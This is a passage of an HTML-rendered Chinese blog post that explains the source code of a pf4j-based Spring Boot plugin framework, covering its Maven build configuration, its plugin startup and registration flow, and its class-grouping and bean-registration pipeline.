class="name">descriptorRef</span>&gt;</span>jar-with-dependencies<span class="tag">&lt;/<span class="name">descriptorRef</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">descriptors</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">pluginManagement</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 插件 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 假设插件的dependencies依赖了一个A.jar，如果A.jar中用到了和主程序相同的依赖，则需要去除 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- build配置 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-assembly-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-dependency-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">id</span>&gt;</span>copy-dependencies<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">phase</span>&gt;</span>package<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                        <span class="comment">&lt;!-- 复制依赖到lib目录，因为pf4j会把target/lib下的jar包也作为classpath环境 --&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goal</span>&gt;</span>copy-dependencies<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">outputDirectory</span>&gt;</span>$&#123;project.build.directory&#125;/lib<span class="tag">&lt;/<span class="name">outputDirectory</span>&gt;</span></span><br><span class="line">                        <span class="comment">&lt;!-- 去除主程序中的依赖 --&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">excludeScope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">excludeScope</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="源码说明"><a href="#源码说明" class="headerlink" title="源码说明"></a>源码说明</h2><h3 id="启动流程"><a href="#启动流程" class="headerlink" title="启动流程"></a>启动流程</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 初始化插件系统入口</span></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> PluginApplication <span class="title">pluginApplication</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> AutoPluginApplication();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用父类DefaultPluginApplication进行初始化</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AutoPluginApplication</span> <span class="keyword">extends</span> <span class="title">DefaultPluginApplication</span></span></span><br><span class="line"><span class="class">    <span class="keyword">implements</span> <span class="title">PluginApplication</span>, <span class="title">InitializingBean</span>, <span class="title">ApplicationContextAware</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 实现了InitializingBean的afterPropertiesSet方法。从而Spring boot bean属性被Set完后，调用会自动初始化插件</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">afterPropertiesSet</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(applicationContext == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"Auto initialize failed. ApplicationContext Not injected."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">super</span>.initialize(applicationContext, pluginInitializerListener);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// DefaultPluginApplication.java</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">initialize</span><span class="params">(ApplicationContext applicationContext,</span></span></span><br><span class="line"><span class="function"><span class="params">                                    PluginInitializerListener listener)</span> </span>&#123;</span><br><span class="line">    Objects.requireNonNull(applicationContext, <span class="string">"ApplicationContext can't be null"</span>);</span><br><span class="line">    <span class="keyword">if</span>(beInitialized.get())&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">"Plugin has been initialized"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    IntegrationConfiguration configuration = getConfiguration(applicationContext);</span><br><span class="line">    <span class="comment">// 如果当前环境没有Pf4jFactory，则创建默认的DefaultPf4jFactory</span></span><br><span class="line">    <span class="keyword">if</span>(integrationFactory == <span class="keyword">null</span>)&#123;</span><br><span class="line">        integrationFactory = <span class="keyword">new</span> DefaultPf4jFactory(configuration);</span><br><span class="line">    &#125;</span><br><span class="line">    PluginManager pluginManager = integrationFactory.getPluginManager();</span><br><span class="line">    pluginUser = createPluginUser(applicationContext, pluginManager);</span><br><span class="line">    pluginOperator = createPluginOperator(applicationContext, pluginManager, configuration);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        setBeanFactory(applicationContext);</span><br><span class="line">        <span class="comment">// 初始化插件</span></span><br><span class="line">        pluginOperator.initPlugins(listener);</span><br><span class="line">        beInitialized.set(<span class="keyword">true</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// DefaultPluginOperator.java</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">boolean</span> <span class="title">initPlugins</span><span class="params">(PluginInitializerListener pluginInitializerListener)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(isInit)&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">"Plugins Already initialized. Cannot be initialized again"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        pluginInitializerListenerFactory.addPluginInitializerListeners(pluginInitializerListener);</span><br><span class="line">        log.info(<span class="string">"Plugins start initialize of root path '&#123;&#125;'"</span>, pluginManager.getPluginsRoot().toString());</span><br><span class="line">        <span class="comment">// 触发插件初始化监听器</span></span><br><span class="line">        pluginInitializerListenerFactory.before();</span><br><span class="line">        <span class="keyword">if</span>(!integrationConfiguration.enable())&#123;</span><br><span class="line">            <span class="comment">// 如果禁用的话, 直接返回</span></span><br><span class="line">            pluginInitializerListenerFactory.complete();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 启动前, 清除空文件</span></span><br><span class="line">        PluginFileUtils.cleanEmptyFile(pluginManager.getPluginsRoot());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 开始初始化插件工厂</span></span><br><span class="line">        pluginFactory.initialize();</span><br><span class="line">        <span class="comment">// 开始加载插件</span></span><br><span class="line">        pluginManager.loadPlugins();</span><br><span class="line">        pluginManager.startPlugins();</span><br><span class="line">        List&lt;PluginWrapper&gt; pluginWrappers = pluginManager.getStartedPlugins();</span><br><span class="line">        <span class="keyword">if</span>(pluginWrappers == <span class="keyword">null</span> || pluginWrappers.isEmpty())&#123;</span><br><span class="line">            log.warn(<span class="string">"Not found plugin!"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">boolean</span> isFoundException = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (PluginWrapper pluginWrapper : pluginWrappers) &#123;</span><br><span class="line">            String pluginId = pluginWrapper.getPluginId();</span><br><span class="line">            GlobalRegistryInfo.addOperatorPluginInfo(pluginId,</span><br><span class="line">                    PluginOperatorInfo.OperatorType.INSTALL, <span class="keyword">false</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// PluginRegistryInfo.build 构建一个插件的基本属性，返回 PluginRegistryInfo 对象</span></span><br><span class="line">                <span class="comment">// ***DefaultPluginFactory 依次注册插件信息到Spring boot</span></span><br><span class="line">                pluginFactory.registry(PluginRegistryInfo.build(pluginWrapper, pluginManager,</span><br><span class="line">                        applicationContext, <span class="keyword">true</span>));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                log.error(<span class="string">"Plugin '&#123;&#125;' registry failure. Reason : &#123;&#125;"</span>, pluginId, e.getMessage(), e);</span><br><span class="line">                isFoundException = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// ***插件注册完成之后，进行后续构建操作</span></span><br><span class="line">        pluginFactory.build();</span><br><span class="line">        isInit = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">if</span>(isFoundException)&#123;</span><br><span class="line">            log.error(<span class="string">"Plugins initialize failure"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            log.info(<span class="string">"Plugins initialize success"</span>);</span><br><span class="line">            pluginInitializerListenerFactory.complete();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        pluginInitializerListenerFactory.failure(e);</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// DefaultPluginFactory.java 注册某个插件</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> PluginFactory <span class="title">registry</span><span class="params">(PluginRegistryInfo pluginRegistryInfo)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(pluginRegistryInfo == <span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Parameter:pluginRegistryInfo cannot be null"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    PluginWrapper pluginWrapper = pluginRegistryInfo.getPluginWrapper();</span><br><span class="line">    <span class="keyword">if</span>(registerPluginInfoMap.containsKey(pluginWrapper.getPluginId()))&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalAccessException(<span class="string">"The plugin '"</span></span><br><span class="line">                + pluginWrapper.getPluginId() +<span class="string">"' already exists, Can't register"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!buildContainer.isEmpty() &amp;&amp; buildType == <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalAccessException(<span class="string">"Unable to Registry operate. Because there's no build"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// ***对一个插件进行流水线处理</span></span><br><span class="line">        <span class="comment">// PluginPipeProcessorFactory 为入口，后续流水线如：PluginClassProcess(对class进行分组)、PluginPipeApplicationContextProcessor(进行插件bean的扫描和注册)、PluginInterceptorsPipeProcessor、ThymeleafProcessor(官方extension扩展)</span></span><br><span class="line">        <span class="comment">// 详细参考下文[注册流水线处理](#注册流水线处理)</span></span><br><span class="line">        pluginPipeProcessor.registry(pluginRegistryInfo);</span><br><span class="line">        registerPluginInfoMap.put(pluginWrapper.getPluginId(), pluginRegistryInfo);</span><br><span class="line">        buildContainer.add(pluginRegistryInfo);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        pluginListenerFactory.failure(pluginWrapper.getPluginId(), e);</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        buildType = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注册成功的后续操作</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">build</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(buildContainer.isEmpty())&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 构建注册的Class插件监听者</span></span><br><span class="line">    pluginListenerFactory.buildListenerClass(applicationContext);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(buildType == <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="comment">// 注册的后续操作</span></span><br><span class="line">            registryBuild();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            unRegistryBuild();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(buildType != <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span> (PluginRegistryInfo pluginRegistryInfo : buildContainer) &#123;</span><br><span class="line">                pluginRegistryInfo.destroy();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        buildContainer.clear();</span><br><span class="line">        buildType = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">registryBuild</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 流水线执行插件注册后的一系列操作，PluginPostProcessorFactory为入口：PluginControllerPostProcessor(处理插件中的controller)，参考下文[Controller处理](#Controller处理)</span></span><br><span class="line">    pluginPostProcessor.registry(buildContainer);</span><br><span class="line">    <span class="keyword">for</span> (PluginRegistryInfo pluginRegistryInfo : buildContainer) &#123;</span><br><span class="line">        pluginListenerFactory.registry(</span><br><span class="line">                pluginRegistryInfo.getPluginWrapper().getPluginId(),</span><br><span class="line">                pluginRegistryInfo.isFollowingInitial());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="注册插件流水线处理"><a href="#注册插件流水线处理" class="headerlink" title="注册插件流水线处理"></a>注册插件流水线处理</h3><h4 id="PluginClassProcess-java对类进行分组"><a href="#PluginClassProcess-java对类进行分组" class="headerlink" title="PluginClassProcess.java对类进行分组"></a>PluginClassProcess.java对类进行分组</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 初始化组类型</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">initialize</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    pluginClassGroups.add(<span class="keyword">new</span> ComponentGroup());</span><br><span class="line">    <span class="comment">// 处理Controller</span></span><br><span class="line">    pluginClassGroups.add(<span class="keyword">new</span> ControllerGroup());</span><br><span class="line">    pluginClassGroups.add(<span class="keyword">new</span> RepositoryGroup());</span><br><span class="line">    pluginClassGroups.add(<span class="keyword">new</span> ConfigDefinitionGroup());</span><br><span class="line">    pluginClassGroups.add(<span class="keyword">new</span> ConfigBeanGroup());</span><br><span class="line">    pluginClassGroups.add(<span class="keyword">new</span> SupplierGroup());</span><br><span class="line">    pluginClassGroups.add(<span class="keyword">new</span> CallerGroup());</span><br><span class="line">    pluginClassGroups.add(<span class="keyword">new</span> OneselfListenerGroup());</span><br><span class="line">    <span class="comment">// 添加扩展</span></span><br><span class="line">    pluginClassGroups.addAll(ExtensionInitializer.getClassGroupExtends());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 流水线处理某个插件</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">registry</span><span class="params">(PluginRegistryInfo pluginRegistryInfo)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    BasePlugin basePlugin = pluginRegistryInfo.getBasePlugin();</span><br><span class="line">    ResourceWrapper resourceWrapper = pluginRegistryInfo.getPluginLoadResource(PluginClassLoader.KEY);</span><br><span class="line">    <span class="keyword">if</span>(resourceWrapper == <span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    List&lt;Resource&gt; pluginResources = resourceWrapper.getResources();</span><br><span class="line">    <span class="keyword">if</span>(pluginResources == <span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (PluginClassGroup pluginClassGroup : pluginClassGroups) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            pluginClassGroup.initialize(basePlugin);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            log.error(<span class="string">"PluginClassGroup &#123;&#125; initialize exception. &#123;&#125;"</span>, pluginClassGroup.getClass(),</span><br><span class="line">                    e.getMessage(), e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Set&lt;String&gt; classPackageNames = resourceWrapper.getClassPackageNames();</span><br><span class="line">    ClassLoader classLoader = basePlugin.getWrapper().getPluginClassLoader();</span><br><span class="line">    <span class="keyword">for</span> (String classPackageName : classPackageNames) &#123;</span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(classPackageName, <span class="keyword">false</span>, classLoader);</span><br><span class="line">        <span class="keyword">if</span>(aClass == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">boolean</span> findGroup = <span class="keyword">false</span>;</span><br><span class="line">        <span class="comment">// 判断属于哪个组，并将类添加到该组</span></span><br><span class="line">        <span class="keyword">for</span> (PluginClassGroup pluginClassGroup : pluginClassGroups) &#123;</span><br><span class="line">            <span class="keyword">if</span>(pluginClassGroup == <span class="keyword">null</span> || StringUtils.isEmpty(pluginClassGroup.groupId()))&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(pluginClassGroup.filter(aClass))&#123;</span><br><span class="line">                pluginRegistryInfo.addGroupClasses(pluginClassGroup.groupId(), aClass);</span><br><span class="line">                findGroup = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!findGroup)&#123;</span><br><span class="line">            <span class="comment">// 默认放到其他组</span></span><br><span class="line">            pluginRegistryInfo.addGroupClasses(OTHER, aClass);</span><br><span class="line">        &#125;</span><br><span class="line">        pluginRegistryInfo.addClasses(aClass);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="PluginPipeApplicationContextProcessor-java进行插件bean的扫描和注册"><a href="#PluginPipeApplicationContextProcessor-java进行插件bean的扫描和注册" class="headerlink" title="PluginPipeApplicationContextProcessor.java进行插件bean的扫描和注册"></a>PluginPipeApplicationContextProcessor.java进行插件bean的扫描和注册</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">initialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    pluginBeanDefinitionRegistrars.add(<span class="keyword">new</span> PluginInsetBeanRegistrar());</span><br><span class="line">    <span class="comment">// 插件中实现 ConfigBean 接口的的处理者</span></span><br><span class="line">    pluginBeanDefinitionRegistrars.add(<span class="keyword">new</span> ConfigBeanRegistrar());</span><br><span class="line">    pluginBeanDefinitionRegistrars.add(<span class="keyword">new</span> ConfigFileBeanRegistrar(mainApplicationContext));</span><br><span class="line">    pluginBeanDefinitionRegistrars.add(<span class="keyword">new</span> BasicBeanRegistrar());</span><br><span class="line">    pluginBeanDefinitionRegistrars.add(<span class="keyword">new</span> InvokeBeanRegistrar());</span><br><span class="line">    pluginBeanDefinitionRegistrars.addAll(ExtensionInitializer.getPluginBeanRegistrarExtends());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span 